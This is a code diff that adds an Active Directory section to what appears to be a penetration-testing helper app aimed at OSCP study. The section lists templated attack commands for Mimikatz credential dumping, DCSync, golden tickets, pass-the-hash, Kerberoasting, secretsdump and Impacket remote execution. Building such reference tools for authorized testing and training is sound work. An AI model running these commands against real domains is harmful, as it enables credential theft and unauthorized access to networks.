@@ -100,6 +100,11 @@ export const SERVICE_MATCHERS: Record<string, ServiceMatcher> = {
     ports: [27017, 27018],
     serviceNames: ['mongodb', 'mongod'],
   },
+  // Active Directory detection (combination of DC services)
+  activeDirectory: {
+    ports: [88, 389, 636, 445, 3268, 3269],
+    serviceNames: ['kerberos', 'ldap', 'microsoft-ds', 'kpasswd', 'msrpc'],
+  },
 };
 
 // =============================================================================
@@ -881,6 +886,217 @@ export const ACTION_CATEGORIES: ActionCategory[] = [
       },
     ],
   },
+
+  // ─────────────────────────────────────────────────────────────────────────────
+  // ACTIVE DIRECTORY
+  // ─────────────────────────────────────────────────────────────────────────────
+  {
+    id: 'active-directory',
+    name: 'Active Directory',
+    icon: 'shield',
+    description: 'Active Directory attacks and enumeration',
+    serviceMatcher: SERVICE_MATCHERS.activeDirectory,
+    tools: [
+      {
+        id: 'bloodhound',
+        name: 'BloodHound',
+        variants: [
+          {
+            id: 'bloodhound-python',
+            label: 'BloodHound.py',
+            command: 'bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -dc <IP> -c All',
+            description: 'Collect all AD data for BloodHound',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'sharphound',
+            label: 'SharpHound',
+            command: 'SharpHound.exe -c All --domain <DOMAIN>',
+            description: 'Run SharpHound collector on target',
+            oscpRelevance: 'high',
+          },
+        ],
+      },
+      {
+        id: 'mimikatz',
+        name: 'Mimikatz',
+        variants: [
+          {
+            id: 'mimikatz-logonpasswords',
+            label: 'logonpasswords',
+            command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
+            description: 'Dump credentials from memory',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'mimikatz-dcsync',
+            label: 'DCSync',
+            command: 'mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:<USER>" "exit"',
+            description: 'DCSync to extract password hash',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'mimikatz-golden',
+            label: 'Golden Ticket',
+            command: 'mimikatz.exe "kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH>" "exit"',
+            description: 'Create golden ticket',
+            oscpRelevance: 'medium',
+          },
+          {
+            id: 'mimikatz-pth',
+            label: 'Pass-the-Hash',
+            command: 'mimikatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH>" "exit"',
+            description: 'Pass-the-hash to spawn process',
+            oscpRelevance: 'high',
+          },
+        ],
+      },
+      {
+        id: 'kerberoasting',
+        name: 'Kerberoasting',
+        variants: [
+          {
+            id: 'kerberoast-getuserspns',
+            label: 'GetUserSPNs.py',
+            command:
+              'GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request -outputfile kerberoast.txt',
+            description: 'Request TGS tickets for offline cracking',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'kerberoast-rubeus',
+            label: 'Rubeus Kerberoast',
+            command: 'Rubeus.exe kerberoast /outfile:hashes.txt',
+            description: 'Kerberoast with Rubeus',
+            oscpRelevance: 'high',
+          },
+        ],
+      },
+      {
+        id: 'asreproast',
+        name: 'AS-REP Roasting',
+        variants: [
+          {
+            id: 'asrep-getnpusers',
+            label: 'GetNPUsers.py',
+            command:
+              'GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <IP> -format hashcat -outputfile asrep.txt',
+            description: 'AS-REP roast users without preauth',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'asrep-rubeus',
+            label: 'Rubeus AS-REP',
+            command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
+            description: 'AS-REP roast with Rubeus',
+            oscpRelevance: 'high',
+          },
+        ],
+      },
+      {
+        id: 'secretsdump',
+        name: 'SecretsDump',
+        variants: [
+          {
+            id: 'secretsdump-local',
+            label: 'Local SAM',
+            command: 'secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL',
+            description: 'Extract hashes from registry hives',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'secretsdump-remote',
+            label: 'Remote Dump',
+            command: 'secretsdump.py <DOMAIN>/<USER>:<PASS>@<IP>',
+            description: 'Remote secrets extraction',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'secretsdump-ntds',
+            label: 'NTDS.dit Dump',
+            command: 'secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL',
+            description: 'Extract hashes from NTDS.dit',
+            oscpRelevance: 'high',
+          },
+        ],
+      },
+      {
+        id: 'crackmapexec-ad',
+        name: 'CrackMapExec AD',
+        variants: [
+          {
+            id: 'cme-ad-users',
+            label: 'Enum Users',
+            command: 'crackmapexec smb <IP> -u <USER> -p <PASS> --users',
+            description: 'Enumerate domain users',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'cme-ad-pass-pol',
+            label: 'Password Policy',
+            command: 'crackmapexec smb <IP> -u <USER> -p <PASS> --pass-pol',
+            description: 'Get password policy',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'cme-ad-sam',
+            label: 'Dump SAM',
+            command: 'crackmapexec smb <IP> -u <USER> -p <PASS> --sam',
+            description: 'Dump SAM database',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'cme-ad-lsa',
+            label: 'Dump LSA',
+            command: 'crackmapexec smb <IP> -u <USER> -p <PASS> --lsa',
+            description: 'Dump LSA secrets',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'cme-ad-ntds',
+            label: 'Dump NTDS',
+            command: 'crackmapexec smb <IP> -u <USER> -p <PASS> --ntds',
+            description: 'Dump NTDS.dit via VSS',
+            oscpRelevance: 'high',
+          },
+        ],
+      },
+      {
+        id: 'impacket-ad',
+        name: 'Impacket',
+        variants: [
+          {
+            id: 'psexec',
+            label: 'psexec.py',
+            command: 'psexec.py <DOMAIN>/<USER>:<PASS>@<IP>',
+            description: 'Remote command execution via SMB',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'wmiexec',
+            label: 'wmiexec.py',
+            command: 'wmiexec.py <DOMAIN>/<USER>:<PASS>@<IP>',
+            description: 'Remote command execution via WMI',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'smbexec',
+            label: 'smbexec.py',
+            command: 'smbexec.py <DOMAIN>/<USER>:<PASS>@<IP>',
+            description: 'Remote command execution via SMB service',
+            oscpRelevance: 'high',
+          },
+          {
+            id: 'atexec',
+            label: 'atexec.py',
+            command: 'atexec.py <DOMAIN>/<USER>:<PASS>@<IP> "command"',
+            description: 'Remote command execution via Task Scheduler',
+            oscpRelevance: 'medium',
+          },
+        ],
+      },
+    ],
+  },
 ];
 
 // =============================================================================
@@ -955,4 +1171,18 @@ export const CATEGORY_TAG_MAP: Record<string, string[]> = {
   snmp: ['SNMP'],
   nfs: ['NFS', 'NETWORK_FILE_SYSTEM'],
   kerberos: ['KERBEROS', 'KERBRUTE', 'ASREPROAST', 'KERBEROAST'],
+  'active-directory': [
+    'ACTIVE_DIRECTORY',
+    'BLOODHOUND',
+    'MIMIKATZ',
+    'KERBEROAST',
+    'ASREPROAST',
+    'SECRETSDUMP',
+    'IMPACKET',
+    'PSEXEC',
+    'WMIEXEC',
+    'DCSYNC',
+    'GOLDEN_TICKET',
+    'PASS_THE_HASH',
+  ],
 };
